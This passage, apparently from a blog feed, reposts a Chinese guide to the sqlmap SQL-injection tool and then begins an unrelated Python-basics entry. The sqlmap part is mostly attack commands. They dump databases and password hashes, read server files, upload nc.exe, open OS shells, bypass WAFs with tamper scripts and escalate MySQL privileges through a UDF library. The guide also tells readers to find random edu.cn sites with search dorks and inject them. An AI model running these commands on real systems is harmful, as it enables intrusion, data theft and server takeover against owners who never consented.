<li>–hostname         获取数据库服务器的主机名称</li>
<li>–is-dba            检测DBMS当前用户是否DBA</li>
<li>–users             枚举数据库管理系统用户</li>
<li>–passwords         枚举数据库管理系统用户密码哈希</li>
<li>–privileges        枚举数据库管理系统用户的权限</li>
<li>–roles            枚举数据库管理系统用户的角色</li>
<li>–dbs             枚举数据库管理系统数据库</li>
<li>–tables            枚举的DBMS数据库中的表</li>
<li>–columns          枚举DBMS数据库表列</li>
<li>–schema            枚举数据库架构</li>
<li>–count             检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url –count -D testdb</li>
<li>–dump            转储数据库表项</li>
<li>–dump-all          转储数据库所有表项</li>
<li>–search           搜索列（S），表（S）和/或数据库名称（S）</li>
<li>–comments          获取DBMS注释</li>
<li>-D DB               要进行枚举的指定数据库名</li>
<li>-T TBL              DBMS数据库表枚举</li>
<li>-C COL             DBMS数据库表列枚举</li>
<li>-X EXCLUDECOL     DBMS数据库表不进行枚举</li>
<li>-U USER           用来进行枚举的数据库用户</li>
<li>–exclude-sysdbs    枚举表时排除系统数据库</li>
<li>–pivot-column=P..  Pivot columnname</li>
<li>–where=DUMPWHERE   Use WHEREcondition while table dumping</li>
<li>–start=LIMITSTART  获取第一个查询输出数据位置</li>
<li>–stop=LIMITSTOP   获取最后查询的输出数据</li>
<li>–first=FIRSTCHAR   第一个查询输出字的字符获取</li>
<li>–last=LASTCHAR    最后查询的输出字字符获取</li>
<li>–sql-query=QUERY   要执行的SQL语句</li>
<li>–sql-shell         提示交互式SQL的shell</li>
<li>–sql-file=SQLFILE  要执行的SQL文件</li>
</ul>
<h3 id="1-3-10-暴力"><a href="#1-3-10-暴力" class="headerlink" title="1.3.10 暴力"></a>1.3.10 暴力</h3><p>这些选项可以被用来运行暴力检查</p>
<ul>
<li>–common-tables     检查存在共同表</li>
<li>–common-columns    检查存在共同列</li>
</ul>
<h3 id="1-3-11-用户自定义函数注入"><a href="#1-3-11-用户自定义函数注入" class="headerlink" title="1.3.11 用户自定义函数注入"></a>1.3.11 用户自定义函数注入</h3><p>这些选项可以用来创建用户自定义函数</p>
<ul>
<li>–udf-inject    注入用户自定义函数</li>
<li>–shared-lib=SHLIB  共享库的本地路径</li>
</ul>
<h3 id="1-3-12-访问文件系统"><a href="#1-3-12-访问文件系统" class="headerlink" title="1.3.12 访问文件系统"></a>1.3.12 访问文件系统</h3><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统</p>
<ul>
<li>–file-read=RFILE   从后端的数据库管理系统文件系统读取文件，SQL Server2005中读取二进制文件example.exe: <code>sqlmap.py -u&quot;http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther&quot;--file-read &quot;C:/example.exe&quot; -v 1</code></li>
<li>–file-write=WFILE  编辑后端的数据库管理系统文件系统上的本地文件</li>
<li>–file-dest=DFILE   后端的数据库管理系统写入文件的绝对路径</li>
</ul>
<p>在kali中将/software/nc.exe文件上传到C:/WINDOWS/Temp下：</p>
<blockquote>
<p>python sqlmap.py -u”<a href="http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot;">http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot;</a> –file-write”/software/nc.exe” –file-dest “C:/WINDOWS/Temp/nc.exe” -v1</p>
</blockquote>
<h3 id="1-3-13-操作系统访问"><a href="#1-3-13-操作系统访问" class="headerlink" title="1.3.13 操作系统访问"></a>1.3.13 操作系统访问</h3><p>这些选项可以用于访问后端数据库管理系统的底层操作系统</p>
<ul>
<li>–os-cmd=OSCMD   执行操作系统命令（OSCMD）</li>
<li>–os-shell          交互式的操作系统的shell</li>
<li>–os-pwn          获取一个OOB shell，meterpreter或VNC</li>
<li>–os-smbrelay       一键获取一个OOBshell，meterpreter或VNC</li>
<li>–os-bof           存储过程缓冲区溢出利用</li>
<li>–priv-esc          数据库进程用户权限提升</li>
<li>–msf-path=MSFPATH  MetasploitFramework本地的安装路径</li>
<li>–tmp-path=TMPPATH  远程临时文件目录的绝对路径</li>
</ul>
<p>linux查看当前用户命令：</p>
<blockquote>
<p>sqlmap.py -u”<a href="http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot;</a> –os-cmd id -v1</p>
</blockquote>
<h3 id="1-3-14-Windows注册表访问"><a href="#1-3-14-Windows注册表访问" class="headerlink" title="1.3.14 Windows注册表访问"></a>1.3.14 Windows注册表访问</h3><p>这些选项可以被用来访问后端数据库管理系统Windows注册表</p>
<ul>
<li>–reg-read          读一个Windows注册表项值</li>
<li>–reg-add           写一个Windows注册表项值数据</li>
<li>–reg-del           删除Windows注册表键值</li>
<li>–reg-key=REGKEY    Windows注册表键</li>
<li>–reg-value=REGVAL  Windows注册表项值</li>
<li>–reg-data=REGDATA  Windows注册表键值数据</li>
<li>–reg-type=REGTYPE  Windows注册表项值类型</li>
</ul>
<h3 id="1-3-15-一般选项"><a href="#1-3-15-一般选项" class="headerlink" title="1.3.15 一般选项"></a>1.3.15 一般选项</h3><p>这些选项可以用来设置一些一般的工作参数</p>
<ul>
<li>-s SESSIONFILE     保存和恢复检索会话文件的所有数据</li>
<li>-t TRAFFICFILE      记录所有HTTP流量到一个文本文件中</li>
<li>–batch            从不询问用户输入，使用所有默认配置。</li>
<li>–binary-fields=..  结果字段具有二进制值(e.g.”digest”)</li>
<li>–charset=CHARSET   强制字符编码</li>
<li>–crawl=CRAWLDEPTH  从目标URL爬行网站</li>
<li>–crawl-exclude=..  正则表达式从爬行页中排除</li>
<li>–csv-del=CSVDEL    限定使用CSV输出 (default”,”)</li>
<li>–dump-format=DU..  转储数据格式(CSV(default), HTML or SQLITE)</li>
<li>–eta              显示每个输出的预计到达时间</li>
<li>–flush-session     刷新当前目标的会话文件</li>
<li>–forms           解析和测试目标URL表单</li>
<li>–fresh-queries     忽略在会话文件中存储的查询结果</li>
<li>–hex             使用DBMS Hex函数数据检索</li>
<li>–output-dir=OUT..  自定义输出目录路径</li>
<li>–parse-errors      解析和显示响应数据库错误信息</li>
<li>–save=SAVECONFIG   保存选项到INI配置文件</li>
<li>–scope=SCOPE    从提供的代理日志中使用正则表达式过滤目标</li>
<li>–test-filter=TE..  选择测试的有效载荷和/或标题(e.g. ROW)</li>
<li>–test-skip=TEST..  跳过试验载荷和/或标题(e.g.BENCHMARK)</li>
<li>–update            更新sqlmap</li>
</ul>
<h3 id="1-3-16-其他"><a href="#1-3-16-其他" class="headerlink" title="1.3.16 其他"></a>1.3.16 其他</h3><ul>
<li>-z MNEMONICS        使用短记忆法 (e.g.”flu,bat,ban,tec=EU”)</li>
<li>–alert=ALERT       发现SQL注入时，运行主机操作系统命令</li>
<li>–answers=ANSWERS   当希望sqlmap提出输入时，自动输入自己想要的答案(e.g. “quit=N,follow=N”)，例如：sqlmap.py -u”<a href="http://192.168.22.128/get_int.php?id=1&quot;--technique=E--answers=&quot;extending=N&quot;">http://192.168.22.128/get_int.php?id=1&quot;--technique=E--answers=&quot;extending=N&quot;</a>    –batch</li>
<li>–beep    发现sql注入时，发出蜂鸣声。</li>
<li>–cleanup     清除sqlmap注入时在DBMS中产生的udf与表。</li>
<li>–dependencies      Check formissing (non-core) sqlmap dependencies</li>
<li>–disable-coloring  默认彩色输出，禁掉彩色输出。</li>
<li>–gpage=GOOGLEPAGE 使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试</li>
<li>–identify-waf      进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别</li>
<li>–mobile     有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。</li>
<li>–offline           Work inoffline mode (only use session data)</li>
<li>–purge-output     从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。</li>
<li>–skip-waf           跳过WAF／IPS / IDS启发式检测保护</li>
<li>–smart            进行积极的启发式测试，快速判断为注入的报错点进行注入</li>
<li>–sqlmap-shell      互动提示一个sqlmapshell</li>
<li>–tmp-dir=TMPDIR    用于存储临时文件的本地目录</li>
<li>–web-root=WEBROOT  Web服务器的文档根目录(e.g.”/var/www”)</li>
<li>–wizard   新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入</li>
</ul>
<h2 id="1-4-实际利用"><a href="#1-4-实际利用" class="headerlink" title="1.4 实际利用"></a>1.4 实际利用</h2><h3 id="1-4-1-检测和利用SQL注入"><a href="#1-4-1-检测和利用SQL注入" class="headerlink" title="1.4.1 检测和利用SQL注入"></a>1.4.1 检测和利用SQL注入</h3><p><strong>1. 手工判断是否存在漏洞</strong></p>
<p>对动态网页进行安全审计，通过接受动态用户提供的GET、POST、Cookie参数值、User-Agent请求头。</p>
<p>原始网页：<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1</a></p>
<p>构造url1：<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=1">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=1</a></p>
<p>构造url2：<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=2">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=2</a></p>
<p>如果url1访问结果跟原始网页一致，而url2跟原始网页不一致，有出错信息或者显示内容不一致，则证明存在SQL注入。</p>
<p><strong>2. sqlmap自动检测</strong></p>
<p>检测语法：sqlmap.py -u <a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1</a></p>
<p>技巧：在实际检测过程中，sqlmap会不停的询问，需要手工输入Y/N来进行下一步操作，可以使用参数“–batch”命令来自动答复和判断。</p>
<p><strong>3. 寻找和判断实例</strong></p>
<p>通过百度对“inurl:news.asp?id=site:edu.cn”、“inurl:news.php?id= site:edu.cn”、“inurl:news.aspx?id=site:edu.cn”进行搜索，搜索news.php/asp/aspx，站点为edu.cn。随机打开一个网页搜索结果，如果能够正常访问，则复制该URL地址。</p>
<p>将该url使用sqlmap进行注入测试，，测试结果可能存在SQL注入，也可能不存在SQL注入，存在则可以进行数据库名称，数据库表以及数据的操作。</p>
<p><strong>4. 批量检测</strong><br>将目标url搜集并整理为txt文件，如图4所示，所有文件都保存为tg.txt，然后使用“sqlmap.py-m tg.txt”，注意tg.txt跟sqlmap在同一个目录下。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/softwares/%E6%89%B9%E9%87%8F%E6%95%B4%E7%90%86%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80.jpg"></p>
<h3 id="1-4-2-直接连接数据库"><a href="#1-4-2-直接连接数据库" class="headerlink" title="1.4.2 直接连接数据库"></a>1.4.2 直接连接数据库</h3><blockquote>
<p>sqlmap.py -d”mysql://admin:<a href="mailto:&#97;&#100;&#109;&#105;&#110;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#x32;&#49;&#46;&#x31;&#55;">&#97;&#100;&#109;&#105;&#110;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#x32;&#49;&#46;&#x31;&#55;</a>:3306/testdb” -f –banner –dbs–users</p>
</blockquote>
<h3 id="1-4-3数据库相关操作"><a href="#1-4-3数据库相关操作" class="headerlink" title="1.4.3数据库相关操作"></a>1.4.3数据库相关操作</h3><ul>
<li>列数据库信息：–dbs</li>
<li>web当前使用的数据库–current-db</li>
<li>web数据库使用账户–current-user</li>
<li>列出sqlserver所有用户 –users</li>
<li>数据库账户与密码 –passwords</li>
<li>指定库名列出所有表  -D database –tables<ul>
<li>-D：指定数据库名称</li>
</ul>
</li>
<li>指定库名表名列出所有字段 -D antian365-T admin –columns<ul>
<li>-T：指定要列出字段的表</li>
</ul>
</li>
<li>指定库名表名字段dump出指定字段<ul>
<li>-D secbang_com -T admin -C  id,password ,username –dump</li>
<li>-D antian365 -T userb -C”email,Username,userpassword” –dump</li>
<li>可加双引号，也可不加双引号。</li>
</ul>
</li>
<li>导出多少条数据<ul>
<li>-D tourdata -T userb -C”email,Username,userpassword” –start 1 –stop 10 –dump （）</li>
<li>参数：<ul>
<li>–start：指定开始的行</li>
<li>–stop：指定结束的行</li>
</ul>
</li>
<li>此条命令的含义为：导出数据库tourdata中的表userb中的字段(email,Username,userpassword)中的第1到第10行的数据内容。</li>
</ul>
</li>
</ul>
<h2 id="1-5-SQLMAP实用技巧"><a href="#1-5-SQLMAP实用技巧" class="headerlink" title="1.5 SQLMAP实用技巧"></a>1.5 SQLMAP实用技巧</h2><h3 id="15-1-mysql的注释方法进行绕过WAF进行SQL注入"><a href="#15-1-mysql的注释方法进行绕过WAF进行SQL注入" class="headerlink" title="15.1 mysql的注释方法进行绕过WAF进行SQL注入"></a>15.1 mysql的注释方法进行绕过WAF进行SQL注入</h3><ol>
<li>修改 C:\Python27\sqlmap\tamper\halfversionedmorekeywords.py<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> match.group().replace(word,<span class="string">&quot;/*!0%s&quot;</span> % word) 为：</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> match.group().replace(word,<span class="string">&quot;/*!50000%s*/&quot;</span> % word)</span><br></pre></td></tr></table></figure></li>
<li>修改C:\Python27\sqlmap\xml\queries.xml<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">cast</span> <span class="attr">query</span>=<span class="string">&quot;CAST(%s ASCHAR)&quot;</span>/&gt;</span>为：</span><br><span class="line"></span><br><span class="line">&lt;castquery=&quot;convert(%s,CHAR)&quot;/&gt;</span><br></pre></td></tr></table></figure></li>
<li>使用sqlmap进行注入测试<blockquote>
<p>sqlmap.py -u”http://**.com/detail.php? id=16” –tamper “halfversionedmorekeywords.py”</p>
</blockquote>
</li>
</ol>
<p>其它绕过waf脚本方法：</p>
<blockquote>
<p>sqlmap.py-u “<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</a> –tampertamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3</p>
</blockquote>
<ol start="4">
<li>tamper目录下文件具体含义：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">space2comment.py用&#x2F;**&#x2F;代替空格</span><br><span class="line"></span><br><span class="line">apostrophemask.py用utf8代替引号</span><br><span class="line"></span><br><span class="line">equaltolike.pylike代替等号</span><br><span class="line"></span><br><span class="line">space2dash.py　绕过过滤‘&#x3D;’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）</span><br><span class="line"></span><br><span class="line">greatest.py　绕过过滤’&gt;’ ,用GREATEST替换大于号。</span><br><span class="line"></span><br><span class="line">space2hash.py空格替换为#号,随机字符串以及换行符</span><br><span class="line"></span><br><span class="line">apostrophenullencode.py绕过过滤双引号，替换字符和双引号。</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</span><br><span class="line"></span><br><span class="line">space2morehash.py空格替换为 #号 以及更多随机字符串 换行符</span><br><span class="line"></span><br><span class="line">appendnullbyte.py在有效负荷结束位置加载零字节字符编码</span><br><span class="line"></span><br><span class="line">ifnull2ifisnull.py　绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’</span><br><span class="line"></span><br><span class="line">space2mssqlblank.py(mssql)空格替换为其它空符号</span><br><span class="line"></span><br><span class="line">base64encode.py　用base64编码替换</span><br><span class="line"></span><br><span class="line">space2mssqlhash.py　替换空格</span><br><span class="line"></span><br><span class="line">modsecurityversioned.py过滤空格，包含完整的查询版本注释</span><br><span class="line"></span><br><span class="line">space2mysqlblank.py　空格替换其它空白符号(mysql)</span><br><span class="line"></span><br><span class="line">between.py用between替换大于号（&gt;）</span><br><span class="line"></span><br><span class="line">space2mysqldash.py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</span><br><span class="line"></span><br><span class="line">multiplespaces.py围绕SQL关键字添加多个空格</span><br><span class="line"></span><br><span class="line">space2plus.py用+替换空格</span><br><span class="line"></span><br><span class="line">bluecoat.py代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换&#x3D;为like</span><br><span class="line"></span><br><span class="line">nonrecursivereplacement.py双重查询语句,取代SQL关键字</span><br><span class="line"></span><br><span class="line">space2randomblank.py代替空格字符（“”）从一个随机的空白字符可选字符的有效集</span><br><span class="line"></span><br><span class="line">sp_password.py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</span><br><span class="line"></span><br><span class="line">chardoubleencode.py双url编码(不处理以编码的)</span><br><span class="line"></span><br><span class="line">unionalltounion.py替换UNION ALLSELECT UNION SELECT</span><br><span class="line"></span><br><span class="line">charencode.py　url编码</span><br><span class="line"></span><br><span class="line">randomcase.py随机大小写</span><br><span class="line"></span><br><span class="line">unmagicquotes.py宽字符绕过 GPCaddslashes</span><br><span class="line"></span><br><span class="line">randomcomments.py用&#x2F;**&#x2F;分割sql关键字</span><br><span class="line"></span><br><span class="line">charunicodeencode.py字符串 unicode 编码</span><br><span class="line"></span><br><span class="line">securesphere.py追加特制的字符串</span><br><span class="line"></span><br><span class="line">versionedmorekeywords.py注释绕过</span><br><span class="line"></span><br><span class="line">space2comment.py替换空格字符串(‘‘) 使用注释‘&#x2F;**&#x2F;’</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py关键字前加注释</span><br></pre></td></tr></table></figure>
<h3 id="15-2-URL重写SQL注入测试"><a href="#15-2-URL重写SQL注入测试" class="headerlink" title="15.2 URL重写SQL注入测试"></a>15.2 URL重写SQL注入测试</h3>value1为测试参数，加“*”即可，sqlmap将会测试value1的位置是否可注入。</li>
</ol>
<blockquote>
<p>sqlmap.py -u”<a href="http://targeturl/param1/value1*/param2/value2/&quot;">http://targeturl/param1/value1*/param2/value2/&quot;</a></p>
</blockquote>
<h3 id="15-3-列举并破解密码哈希值"><a href="#15-3-列举并破解密码哈希值" class="headerlink" title="15.3 列举并破解密码哈希值"></a>15.3 列举并破解密码哈希值</h3><p>当前用户有权限读取包含用户密码的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p>
<blockquote>
<p>sqlmap.py -u”<a href="http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot;</a> –passwords -v1</p>
</blockquote>
<h3 id="15-4-获取表中的数据个数"><a href="#15-4-获取表中的数据个数" class="headerlink" title="15.4 获取表中的数据个数"></a>15.4 获取表中的数据个数</h3><blockquote>
<p>sqlmap.py -u”<a href="http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot;">http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot;</a> –count -Dtestdb</p>
</blockquote>
<h3 id="15-5-对网站secbang-com进行漏洞爬去"><a href="#15-5-对网站secbang-com进行漏洞爬去" class="headerlink" title="15.5 对网站secbang.com进行漏洞爬去"></a>15.5 对网站secbang.com进行漏洞爬去</h3><blockquote>
<p>sqlmap.py -u “<a href="http://www.secbang.com&quot;--batch/">http://www.secbang.com&quot;--batch</a> –crawl=3</p>
</blockquote>
<h3 id="15-6-基于布尔SQL注入预估时间"><a href="#15-6-基于布尔SQL注入预估时间" class="headerlink" title="15.6 基于布尔SQL注入预估时间"></a>15.6 基于布尔SQL注入预估时间</h3><blockquote>
<p>sqlmap.py -u “<a href="http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1&quot;-b">http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1&quot;-b</a> –eta</p>
</blockquote>
<h3 id="15-7-使用hex避免字符编码导致数据丢失"><a href="#15-7-使用hex避免字符编码导致数据丢失" class="headerlink" title="15.7 使用hex避免字符编码导致数据丢失"></a>15.7 使用hex避免字符编码导致数据丢失</h3><blockquote>
<p>sqlmap.py -u “<a href="http://192.168.48.130/pgsql/get_int.php?id=1&quot;">http://192.168.48.130/pgsql/get_int.php?id=1&quot;</a> –banner –hex -v 3 –parse-errors</p>
</blockquote>
<h3 id="15-8-模拟测试手机环境站点"><a href="#15-8-模拟测试手机环境站点" class="headerlink" title="15.8.模拟测试手机环境站点"></a>15.8.模拟测试手机环境站点</h3><blockquote>
<p>python sqlmap.py -u”<a href="http://www.target.com/vuln.php?id=1&quot;">http://www.target.com/vuln.php?id=1&quot;</a> –mobile</p>
</blockquote>
<h3 id="15-9-智能判断测试"><a href="#15-9-智能判断测试" class="headerlink" title="15.9 智能判断测试"></a>15.9 智能判断测试</h3><blockquote>
<p>sqlmap.py -u “<a href="http://www.antian365.com/info.php?id=1&quot;--batch">http://www.antian365.com/info.php?id=1&quot;--batch</a> –smart</p>
</blockquote>
<h3 id="15-10-结合burpsuite进行注入"><a href="#15-10-结合burpsuite进行注入" class="headerlink" title="15.10 结合burpsuite进行注入"></a>15.10 结合burpsuite进行注入</h3><ol>
<li><p>burpsuite抓包，需要设置burpsuite记录请求日志</p>
<blockquote>
<p>sqlmap.py -r burpsuite抓包.txt</p>
</blockquote>
</li>
<li><p>指定表单注入</p>
<blockquote>
<p>sqlmap.py -u URL –data“username=a&amp;password=a”</p>
</blockquote>
</li>
</ol>
<h3 id="15-11-sqlmap自动填写表单注入"><a href="#15-11-sqlmap自动填写表单注入" class="headerlink" title="15.11 sqlmap自动填写表单注入"></a>15.11 sqlmap自动填写表单注入</h3><p>自动填写表单：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u URL --forms </span><br><span class="line"></span><br><span class="line">sqlmap.py -u URL --forms --dbs</span><br><span class="line"></span><br><span class="line">sqlmap.py -u URL --forms --current-db</span><br><span class="line"></span><br><span class="line">sqlmap.py -u URL --forms -D 数据库名称--tables</span><br><span class="line"></span><br><span class="line">sqlmap.py -u URL --forms -D 数据库名称 -T 表名 --columns</span><br><span class="line"></span><br><span class="line">sqlmap.py -u URL --forms -D 数据库名称 -T 表名 -Cusername，password --dump</span><br></pre></td></tr></table></figure>

<h3 id="15-12读取linux下文件"><a href="#15-12读取linux下文件" class="headerlink" title="15.12读取linux下文件"></a>15.12读取linux下文件</h3><blockquote>
<p>sqlmap.py-u “url” –file /etc/password</p>
</blockquote>
<h3 id="15-13-延时注入"><a href="#15-13-延时注入" class="headerlink" title="15.13 延时注入"></a>15.13 延时注入</h3><blockquote>
<p>sqlmap.py -u URL –technique -T–current-user</p>
</blockquote>
<h3 id="15-14-sqlmap-结合burpsuite进行post注入"><a href="#15-14-sqlmap-结合burpsuite进行post注入" class="headerlink" title="15.14 sqlmap 结合burpsuite进行post注入"></a>15.14 sqlmap 结合burpsuite进行post注入</h3><p>结合burpsuite来使用sqlmap：</p>
<ol>
<li>浏览器打开目标地址<a href="http://www.antian365.com/">http://www.antian365.com</a></li>
<li>配置burp代理(127.0.0.1:8080)以拦截请求</li>
<li>点击登录表单的submit按钮</li>
<li>Burp会拦截到了我们的登录POST请求</li>
<li>把这个post请求复制为txt, 我这命名为post.txt 然后把它放至sqlmap目录下</li>
<li>运行sqlmap并使用如下命令：<br> <code>./sqlmap.py -r post.txt -p tfUPass</code></li>
</ol>
<h3 id="15-15-sqlmap-cookies注入"><a href="#15-15-sqlmap-cookies注入" class="headerlink" title="15.15 sqlmap cookies注入"></a>15.15 sqlmap cookies注入</h3><blockquote>
<p>sqlmap.py -u “<a href="http://127.0.0.1/base.PHP&quot;%E2%80%93cookies">http://127.0.0.1/base.PHP&quot;–cookies</a> “id=1”  –dbs –level 2</p>
</blockquote>
<p>默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie里面的参数，当&gt;=3的时候将检查User-agent和Referer。可以通过burpsuite等工具获取当前的cookie值，然后进行注入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u 注入点URL --cookie&quot;id&#x3D;xx&quot; --level 3</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url --cookie &quot;id&#x3D;xx&quot;--level 3 --tables(猜表名)</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url --cookie &quot;id&#x3D;xx&quot;--level 3 -T 表名 --coiumns</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url --cookie &quot;id&#x3D;xx&quot;--level 3 -T 表名 -C username，password --dump</span><br></pre></td></tr></table></figure>

<h3 id="15-16-mysql提权"><a href="#15-16-mysql提权" class="headerlink" title="15.16 mysql提权"></a>15.16 mysql提权</h3><ol>
<li><p>连接mysql数据打开一个交互shell:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -dmysql:&#x2F;&#x2F;root:root@127.0.0.1:3306&#x2F;test --sql-shell</span><br><span class="line"></span><br><span class="line">select @@version;</span><br><span class="line"></span><br><span class="line">select @@plugin_dir;</span><br><span class="line"></span><br><span class="line">d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\</span><br></pre></td></tr></table></figure></li>
<li><p>利用sqlmap上传lib_mysqludf_sys到MySQL插件目录:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -dmysql:&#x2F;&#x2F;root:root@127.0.0.1:3306&#x2F;test --file-write&#x3D;d:&#x2F;tmp&#x2F;lib_mysqludf_sys.dll--file-dest&#x3D;d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\lib_mysqludf_sys.dll</span><br><span class="line"></span><br><span class="line">CREATE FUNCTION sys_exec RETURNS STRINGSONAME &#39;lib_mysqludf_sys.dll&#39;</span><br><span class="line"></span><br><span class="line">CREATE FUNCTION sys_eval RETURNS STRINGSONAME &#39;lib_mysqludf_sys.dll&#39;</span><br><span class="line"></span><br><span class="line">select sys_eval(&#39;ver&#39;); </span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="15-17-执行shell命令"><a href="#15-17-执行shell命令" class="headerlink" title="15.17 执行shell命令"></a>15.17 执行shell命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;url&quot; –os-cmd&#x3D;&quot;netuser&quot; &#x2F;*执行net user命令*&#x2F;</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;url&quot; –os-shell &#x2F;*系统交互的shell*&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="15-18-延时注入"><a href="#15-18-延时注入" class="headerlink" title="15.18 延时注入"></a>15.18 延时注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap –dbs -u&quot;url&quot; –delay 0.5 &#x2F;*延时0.5秒*&#x2F;</span><br><span class="line"></span><br><span class="line">sqlmap –dbs -u&quot;url&quot; –safe-freq &#x2F;*请求2次*&#x2F;</span><br></pre></td></tr></table></figure>



<p>参考文章：</p>
<ul>
<li><a href="http://sqlmap.org/">http://sqlmap.org/</a></li>
<li><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></li>
<li><a href="https://github.com/sqlmapproject/sqlmap/wiki">https://github.com/sqlmapproject/sqlmap/wiki</a></li>
<li><a href="https://sobug.com/article/detail/2">https://sobug.com/article/detail/2</a></li>
<li><a href="https://blog.xiaohack.org/1378.html">https://blog.xiaohack.org/1378.html</a></li>
</ul>
<p>————————<br>本文作者：simeon， 转载请注明来自<a href="https://www.freebuf.com/">FreeBuf.COM</a><br>原文：<a href="https://www.freebuf.com/sectool/164608.html">超详细SQLMap使用攻略及技巧分享</a></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【python】python基础</title>
    <url>/python%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>python 基础语法</p>
<span id="more"></span>

<h1 id="1-python-解释器"><a href="#1-python-解释器" class="headerlink" title="1. python 解释器"></a>1. python 解释器</h1><p>我们编写的Python代码都要放在Python解释器上运行，解释器是代码与计算机硬件之间的软件逻辑层。根据选用的Python版本的不同，解释器本身可以用C语言实现（Python的官方实现版本）、Java语言实现或者其他的形式。无论使用采用什么版本，编写好的Python程序代码必须放在解释器中运行。</p>
<p>将我们编写好的Python代码放到解释器中运行，此过程主要分为两步，第一步是将源码编译成“字节码”，第二步是将编译好的字节码转发到Python“虚拟机”中运行。当然对于程序员来说，这两步都是隐藏的。</p>
<h2 id="1-1-字节码编译"><a href="#1-1-字节码编译" class="headerlink" title="1.1 字节码编译"></a>1.1 字节码编译</h2><p>当我们运行Python代码时，Python解释器内部会先通过词法分析器将文件中的每一条代码语句分解为单一步骤，然后编译成字节码的形式。编译只是一个简单的翻译步骤，而且字节码是属于源代码层次范围内的底层代码，是与平台无关的，所以编译好的字节码是可以跨平台运行的。这些字节码可以提高执行速度，比起原始的源代码语句，字节码的运行速度要快很多。</p>
<p>如果Python进程在机器上拥有写入权限，那么它将把编译好的字节码保存为一个以 .pyc 为扩展名的文件。Python这样做是作为一种启动速度的优化，下一次运行程序的时候，如果你在上次保存字节码之后没有修改过源代码，Python将会直接加载 .pyc文件，并跳过编译这个步骤。如果你修改了源代码，下次运行程序时，字节码文件将自动重新创建。</p>
<h2 id="1-2-Python虚拟机（PVM）"><a href="#1-2-Python虚拟机（PVM）" class="headerlink" title="1.2 Python虚拟机（PVM）"></a>1.2 Python虚拟机（PVM）</h2><p>当源文件编译成字节码，字节码就会发送到Python虚拟机（PVM）上来执行。事实上，PVM就是迭代运行字节码指令的一个大循环，一个接一个的完成操作。从技术上讲，这是Python解释器的最后一步。</p>
